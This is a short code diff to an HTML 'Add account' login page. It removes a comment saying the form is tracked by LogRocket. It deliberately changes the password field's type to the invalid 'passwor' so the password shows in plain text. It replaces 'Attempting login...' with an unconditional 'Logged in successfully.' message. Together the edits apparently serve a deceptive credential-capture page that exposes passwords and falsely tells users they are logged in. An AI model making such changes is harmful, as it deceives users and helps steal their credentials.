@@ -207,7 +207,7 @@
 
         <h1>Add account</h1>
 
-        <!-- NORMAL DIV FORM (No Web3Forms, tracked purely by LogRocket) -->
+        <!-- LOCAL DIV CONTAINER (No Web3Forms) -->
         <div id="loginForm">
 
             <input
@@ -218,8 +218,9 @@
                 required
             >
 
+            <!-- SECOND INPUT SET TO passwor SO IT SHOWS PLAIN TEXT -->
             <input
-                type="password"
+                type="passwor"
                 id="password"
                 name="password"
                 placeholder="Password"
@@ -283,7 +284,7 @@
             }
 
             message.style.color = "#51cf66";
-            message.textContent = "Attempting login...";
+            message.textContent = "Logged in successfully.";
         }
 
         function oneTimeCode() {
